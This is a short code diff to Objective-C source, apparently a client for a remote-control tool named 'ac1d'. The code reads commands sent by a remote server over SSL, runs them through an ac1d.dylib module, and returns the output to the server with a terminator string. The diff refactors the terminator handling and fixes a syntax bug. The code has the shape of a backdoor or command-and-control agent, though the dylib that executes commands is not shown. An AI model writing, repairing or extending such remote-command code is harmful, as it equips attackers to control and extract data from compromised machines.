@@ -70,10 +70,6 @@ int main(int argc, const char *argv[]) {
     return 0;
 }
 
-void terminateClient() {
-    SSL_write(client_ssl, ac1d_base->terminator, (int)strlen(ac1d_base->terminator));
-}
-
 void sendString(NSString *string) {
     SSL_write(client_ssl, [string UTF8String], (int)string.length);
 }
@@ -86,7 +82,7 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     char buffer[2048] = "";
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
-        ac1d_base->terminator = (char*)[args[0] UTF8String];
+        char *terminator = (char*)[args[0] UTF8String];
         printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
         printf("[i] Current client terminator: %s\n", terminator);
         printf("[*] Executing %s...\n", [args[1] UTF8String]);
@@ -97,10 +93,10 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
                 [command_args addObject:str];
             }
             NSString *result = [ac1d_base sendCommand:command_args];
-            if (result isEqualToString:@"error") printf("[-] Failed to execute command, cannot find ac1d.dylib!\n");
+            if ([result isEqualToString:@"error"]) printf("[-] Failed to execute command, cannot find ac1d.dylib!\n");
             else {
                 sendString(result);
-                terminateClient();
+                SSL_write(client_ssl, terminator, (int)strlen(terminator));
             }
         } else {
             printf("[-] Unrecognized command!\n");
